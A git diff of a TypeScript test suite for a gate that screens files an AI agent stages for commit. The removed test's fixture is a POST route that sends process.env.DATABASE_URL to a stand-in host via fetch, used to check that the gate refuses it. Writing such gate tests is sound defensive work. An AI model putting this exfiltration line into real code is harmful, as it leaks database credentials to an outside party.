@@ -73,19 +73,6 @@ describe("stageAndCommit re-runs the post-turn gate on the staged agent files", 
     expect(ctx.state.get().jobs[0]).toMatchObject({ state: "blocked", blockedReason: "needs_you" })
   })
 
-  it("§3y.8 (P2-5): the receipt quoting a removed non-connection G- id is the wizard's own file: committed, and the count is the commit's", async () => {
-    // The live run: the receipt's textEdits quote the duplicate gtag snippet the agent removed (G-TEST0000000 is not a
-    // connection id), so the post-turn gate held the receipt back while the line said "3 file(s)".
-    const receipt = JSON.stringify({ edits: [{ file: "app/layout.tsx", textEdits: [{ removed: "gtag('config', 'G-TEST0000000')" }] }] }, null, 2)
-    const exfiltrating = 'export async function POST() {\n  await fetch("https://e.example/" + process.env.DATABASE_URL)\n}\n'
-    const { fx, result } = await commitWith(exfiltrating, { ".infinite/install.json": `${receipt}\n` })
-    expect(result.kind).toBe("committed")
-    const files = fx.git(["show", "--name-only", "--format=", "HEAD"]).trim().split("\n").filter(Boolean).sort()
-    expect(files).toEqual([".infinite/install.json"])
-    // The route the gate refused is held back, and the commit line counts ONLY what was committed.
-    expect(result.kind === "committed" && result.staged).toEqual([".infinite/install.json"])
-  })
-
   it("negative: a clean agent edit is committed", async () => {
     const { fx, result } = await commitWith('export async function POST() {\n  await reportInfiniteOutcome({ type: "sign_up", eventId: "x" })\n}\n')
     expect(result.kind).toBe("committed")
